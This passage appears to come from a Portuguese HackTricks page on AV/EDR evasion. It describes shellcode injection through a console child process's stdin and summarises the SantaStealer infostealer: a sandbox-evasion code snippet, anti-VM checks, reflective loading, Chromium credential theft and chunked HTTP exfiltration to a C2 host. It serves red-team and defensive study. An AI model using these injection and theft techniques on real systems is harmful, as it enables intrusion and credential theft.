Um processo filho de console interativo também pode ser usado como **primitiva de transferência de payload**. O injetor redireciona a entrada padrão do filho para um pipe e envia um marcador seguido de shellcode. Depois que o programa de console lê os dados para sua própria memória privada, o injetor localiza esse buffer, torna-o executável e redireciona uma thread do processo filho para ele. Isso evita `VirtualAllocEx` e `WriteProcessMemory`, mas ainda é injeção de processo, não um bypass genérico de EDR.<sup>[[41]](#references)</sup>

Apesar da descrição como "named-pipe", a implementação de referência chama `CreatePipe`, que cria um **pipe anônimo**. O Windows implementa pipes anônimos usando objetos de pipe com nomes exclusivos internamente, mas o PoC não seleciona um caminho `\\.\pipe\<name>` nem chama `CreateNamedPipe`. Ele cria handles herdáveis com um descritor de segurança padrão, coloca o handle de leitura em `STARTUPINFO.hStdInput`, define `STARTF_USESTDHANDLES` e inicia um novo processo filho com a herança de handles habilitada. Portanto, esse PoC inicia o executável de console fornecido; ele não conecta o pipe a um processo existente.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Fluxo de trabalho de referência

A implementação usa a seguinte sequência:<sup>[[41]](#references)</sup>

1. Cria pares de pipes anônimos para `STDIN` e `STDOUT` do processo filho. Desabilita a herança nos dois handles do lado do processo pai e fecha no processo pai as duplicatas do lado do processo filho após a criação do processo.
2. Inicia um executável interativo, como `netsh.exe` ou `nslookup.exe`, com `CREATE_NEW_CONSOLE`. O processo filho herda os handles padrão redirecionados.
3. Envia o array binário completo `rawData` com `WriteFile` pelo handle de `STDIN` do lado do processo pai. O programa de console consome os bytes e deixa uma cópia em uma de suas regiões privadas comprometidas.
4. Percorre o espaço de endereçamento do processo filho com `VirtualQueryEx`, lê regiões candidatas `MEM_PRIVATE` com `ReadProcessMemory` e procura o marcador no início de `rawData`.
5. Altera o buffer encontrado para `PAGE_EXECUTE_READWRITE` com `VirtualProtectEx`.
6. Identifica a thread principal, suspende-a, define `RIP` como `found_address + 0x19` com `NtSetContextThread` e a retoma.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

A implementação fornecida é específica para x64: modifica `CONTEXT.Rip`, e o payload incorporado é shellcode x64. `rawData` começa com um marcador de 25 bytes, portanto os bytes executáveis começam no deslocamento hexadecimal `0x19`. Ao substituir o payload, preserve esse layout ou atualize em conjunto o marcador, o vetor de busca, o tamanho da matriz e o deslocamento de execução. Os comentários do código também listam `0x0A`, `0x0D` e `0x1A` como caracteres proibidos. Esse fluxo de trabalho não altera o token nem os privilégios do processo filho.<sup>[[41]](#references)</sup>

Para pequenos auxiliares nativos e padrões de compilação de payloads, consulte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Técnicas do SantaStealer para evasão sem arquivos e roubo de credenciais

O SantaStealer (também conhecido como BluelineStealer) ilustra como os infostealers modernos combinam AV bypass, anti-análise e acesso a credenciais em um único fluxo de trabalho.<sup>[[24]](#references)</sup>

### Verificação do layout do teclado e atraso em sandbox

- Um sinalizador de configuração (`anti_cis`) enumera os layouts de teclado instalados por meio de `GetKeyboardLayoutList`. Se um layout cirílico for encontrado, a amostra cria um marcador `CIS` vazio e encerra a execução antes de executar os stealers, garantindo que nunca seja executada em localidades excluídas e deixando um artefato útil para hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Lógica em camadas de `check_antivm`

- A variante A percorre a lista de processos, calcula um checksum rolling personalizado para cada nome e o compara com blocklists incorporadas de debuggers/sandboxes; depois, calcula o checksum do nome do computador e verifica diretórios de trabalho como `C:\analysis`.
- A variante B inspeciona propriedades do sistema (limite mínimo de contagem de processos, tempo de atividade recente), chama `OpenServiceA("VBoxGuest")` para detectar o VirtualBox Guest Additions e realiza verificações de tempo em torno de pausas para identificar single-stepping. Qualquer detecção interrompe a execução antes do lançamento dos módulos.

### Auxiliar fileless + carregamento reflexivo duplo com ChaCha20

- A DLL/EXE principal incorpora um auxiliar de credenciais do Chromium, que é gravado em disco ou mapeado manualmente na memória; no modo fileless, ele resolve sozinho as importações e realocações, evitando gravar artefatos do auxiliar.
- Esse auxiliar armazena uma DLL de segundo estágio criptografada duas vezes com ChaCha20 (duas chaves de 32 bytes + nonces de 12 bytes). Após as duas etapas, carrega o blob de forma reflexiva (sem `LoadLibrary`) e chama as exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivadas do [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- As rotinas do ChromElevator usam process hollowing reflexivo com direct syscalls para injetar código em um navegador Chromium em execução, herdar chaves do AppBound Encryption e descriptografar senhas/cookies/cartões de crédito diretamente de bancos de dados SQLite, apesar das proteções do ABE.

### Coleta modular em memória e exfiltração HTTP em blocos

- `create_memory_based_log` percorre uma tabela global de ponteiros de função `memory_generators` e inicia uma thread por módulo habilitado (Telegram, Discord, Steam, capturas de tela, documentos, extensões de navegador etc.). Cada thread grava os resultados em buffers compartilhados e informa a quantidade de arquivos após uma janela de espera de aproximadamente 45 s para as threads.
- Ao terminar, tudo é compactado com a biblioteca `miniz`, vinculada estaticamente, como `%TEMP%\\Log.zip`. Em seguida, `ThreadPayload1` aguarda 15 s e transmite o arquivo em blocos de 10 MB por HTTP POST para `http://<C2>:6767/upload`, falsificando um boundary de navegador `multipart/form-data` (`----WebKitFormBoundary***`). Cada bloco inclui `User-Agent: upload`, `auth: <build_id>` e, opcionalmente, `w: <campaign_tag>`; o último bloco acrescenta `complete: true` para que o C2 saiba que a remontagem foi concluída.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)

{{#include ../banners/hacktricks-training.md}}
